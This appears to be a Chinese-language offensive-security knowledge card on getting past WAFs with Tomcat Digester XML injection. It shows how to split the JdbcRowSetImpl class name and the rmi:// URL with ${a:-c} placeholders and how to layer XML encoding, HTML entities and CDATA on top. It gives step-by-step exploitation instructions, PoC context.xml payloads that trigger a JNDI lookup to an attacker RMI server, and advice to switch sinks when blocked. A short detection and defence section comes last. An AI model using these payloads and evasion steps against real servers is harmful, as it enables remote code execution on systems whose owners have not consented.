---
id: web-java-component-tomcat-digester-xml-placeholder-encoding-waf-bypass
title: Tomcat Digester XML 注入绕过 WAF：XML 编码/实体/CDATA 混淆与 ${a:-c}om 属性占位符拆分 className
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-digester-xml-placeholder-encoding-waf-bypass
aliases:
- Digester 占位符绕过
- ${a:-c}om
- IntrospectionUtils.replaceProperties
- XML 配置 WAF 绕过
- context.xml 免杀
- JdbcRowSetImpl 类名拆分
tags:
- java
- tomcat
- digester
- xml
- waf-bypass
- jndi
- jdbcrowsetimpl
- placeholder
- encoding
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V481
  verified_at: '2026-11-10T20:33:45+08:00'
  notes: 已对照幻灯片12-16核对：Digester createContextDigester 的 fakeAttributes(className/source)、SetPropertiesRule→IntrospectionUtils.setProperty 反射 setXxx、Manager className=com.sun.rowset.JdbcRowSetImpl/dataSourceName=rmi://.../autoCommit=true、编码混淆三法（xml encoding/html实体/cdata）、com.jdbcxxx→com.jdbcxxx 与 replaceProperties 的 :- 默认值分支均属实；卡内延伸的 rmi 与实体叠加已标注为同机制外推。未验证点：未对真实 Tomcat/JNDI 复现，JNDI 可用性受 JDK 版本限制（卡内已标注）。
---

## 一句话结论

向 Tomcat 可解析位置（`conf/server.xml`、`conf/Catalina/<host>/*.xml`、WAR 内 `META-INF/context.xml` 等）写 XML 时，Digester 会在规则处理前对所有属性值调用 `IntrospectionUtils.replaceProperties` 解析 `${name}` / `${name:-default}` 占位符：把类名写成 `${a:-c}om.sun.rowset.JdbcRowSetImpl`（或拆成多段），WAF 看不到完整类名，Tomcat 解析时按默认值还原为真类名并照常反射实例化/调用 setter，触发 `JdbcRowSetImpl` 的 JNDI 注入；再叠加 XML `encoding` 声明、HTML 实体（`&#x63;`）与 CDATA 包裹，内容规则更难命中。

## 原理

- **Digester 的属性预处理**：Tomcat 解析 XML 时先把标签属性整体交给 `IntrospectionUtils.replaceProperties(value, ...)` 做占位符替换（幻灯片展示了 Digester 遍历 `newAttrs` 并对每个值调用替换的代码），然后 `ObjectCreateRule` 用 `className` 加载/实例化类，`SetPropertiesRule` 把其余属性反射成 `setXxx` 调用。因此替换作用于**所有属性**（包括 `className`、`dataSourceName` 等危险值），而不只是普通配置项。
- **`${name:-default}` 语义**：`replaceProperties` 扫描 `${...}`；对 `${n:-dv}`，在 `:-` 处切分，先按 `n` 查系统属性/类属性，查不到就用默认值 `dv`。攻击者依赖“属性不存在”这一条件：`${a:-c}om.sun.rowset.JdbcRowSetImpl` 中 `a` 未定义 → 取 `c` → 拼成 `com.sun.rowset.JdbcRowSetImpl`；`${x:-r}mi://...` → `rmi://...`。
- **XML 层混淆**：可在文件头用 `encoding=` 声明非常见字符集（容器按声明解码、WAF 按 UTF-8 看到乱码）；属性值中的 HTML 实体（`&#x63;om...`）在 XML 解析阶段解码；CDATA 段可包裹/切分内容。这些混淆与占位符叠加后，WAF 即使匹配到部分文本也拼不出真实的类名与 URL。
- **sink 不变**：XML 形如 `<Context><Manager className="..." dataSourceName="rmi://..." autoCommit="true"/></Context>`；Digester 按属性顺序实例化 `JdbcRowSetImpl` 并调用 `setDataSourceName`/`setAutoCommit(true)`，后者触发 `connect()` 里的 `InitialContext.lookup`。sink 细节与可达路径见 [[web-java-component-tomcat-xml-digester-setter-jndi]]。
- **为什么有效**：WAF 看到的是 XML 原文（含占位符/实体/编码），Tomcat 看到的是“替换 + 解码后的最终值”；两者对同一个属性的语义不同，基于明文类名/URL 的规则失效。

## 触发条件

- 存在可写入 Tomcat 配置/描述符的入口：上传允许 `.xml` 且可穿越到 `conf/Catalina/<host>/`、WAR 上传（`META-INF/context.xml`）、任意文件写等；
- 目标使用 Tomcat（Digester 解析配置），且 `autoDeploy`/自动部署开启或可重启触发；
- WAF 对 XML 内容做明文关键字匹配，未实现占位符替换与编码归一化；
- JNDI 目标可达：JDK 8u191+/11.0.1+ 默认禁止远程 codebase，需要本地 gadget 或目标已有可利用的 LDAP 返回对象。

## 利用步骤

1. 找到可写 XML 的落点（见触发条件），确认 Tomcat 会解析该位置（context descriptor / WAR context.xml / server.xml）。
2. 构造 `<Context><Manager .../></Context>`，先用未混淆的 `className`/`dataSourceName` 确认逻辑可达（本地测试环境）。
3. 对 WAF 做混淆：`className="${a:-c}om.sun.rowset.JdbcRowSetImpl"`，`dataSourceName="${x:-r}mi://<attacker>/Exploit"`；需要时把字符串拆成多个 `${...:-...}` 段，或加 XML 实体/CDATA/`encoding` 声明。
4. 写入 XML，等待 `ContainerBackgroundProcessor` 自动部署（约 10 秒级）或重启 Tomcat 触发解析。
5. 在攻击者侧启动 LDAP/RMI 服务（或使用本地 gadget），确认 JNDI lookup 触发命令执行。
6. 若被拦截，换用其它属性/标签承载占位符，或改用其它 XML sink（server.xml Listener、web.xml 等）。

## PoC

```xml
<?xml version="1.0" encoding="utf-8"?>
<Context>
  <Manager className="${a:-c}om.sun.rowset.JdbcRowSetImpl"
           dataSourceName="${x:-r}mi://127.0.0.1:1443/Exploit"
           autoCommit="true"/>
</Context>
```

```xml
<!-- 叠加实体/编码的写法（示意）：&#x63; 解码为 c；文件也可按 encoding 声明的字符集保存 -->
<Context>
  <Manager className="${a:-&#x63;}om.sun.rowset.JdbcRowSetImpl"
           dataSourceName="${x:-r}mi://127.0.0.1:1443/Exploit"
           autoCommit="true"/>
</Context>
```

幻灯片给出的核心验证是 `${a:-c}om.jdbcxxx` → `com.jdbcxxx`；以上为按该机制整理的 XML 骨架，`dataSourceName` 占位符与实体叠加为同机制的合理外推，未在真实目标执行。

## 变体与关联

- 变体：占位符来源换成系统属性（若目标恰好定义了可利用的属性值）；用多个 `${...:-...}` 拼接整个类名/URL；在其它属性（如 `driverClassName`、`url`）上做同样拆分。
- 变体：XML 层叠加 `encoding` 声明、HTML 实体、CDATA（与 JSP 编码/实体手法同源），见 [[web-generic-file-upload-jsp-multi-encoding-pageencoding-waf-bypass]]、[[web-generic-file-upload-jspx-xml-pi-entity-cdata-waf-bypass]]。
- 关联：[[web-java-component-tomcat-xml-digester-setter-jndi]]（Digester setter JNDI 的 sink 与可达路径）、[[web-java-component-tomcat-digester-jsp-runtime-webshell]]（Digester 运行时 JSP webshell）、[[web-java-component-tomcat-war-listener-contextinitialized-deploy-rce]]（WAR 部署触发）。
- 边界：`replaceProperties` 只认 `${...}` 语法且属性不存在才用默认值；XML 必须能被 Digester 正确解析；JDK 高版本 JNDI 信任策略限制远程 codebase；Tomcat 版本差异可能影响属性处理顺序。

## 检测与防御

- 检测（WAF）：检查 XML 时先模拟 Tomcat 的属性替换（解析 `${n:-dv}`）与 XML 实体/编码解码，再对最终值匹配 `JdbcRowSetImpl`、`InitialContext`、`ldap://`/`rmi://` 等特征；对含 `${...}` 占位符的 `className`/`dataSourceName` 直接告警。
- 检测（主机）：`conf/Catalina/`、`WEB-INF/context.xml` 等位置出现新增/修改 XML；Tomcat 日志出现 Digester 解析新描述符、JNDI lookup；JVM 发起异常 LDAP/RMI 外连。
- 防御：不允许上传/写入 XML 到配置或部署目录；上传目录移出 Web 根；限制 `autoDeploy`；对 Tomcat 配置目录做完整性监控；升级 JDK 并禁用远程 codebase，减少 JNDI 可利用面。
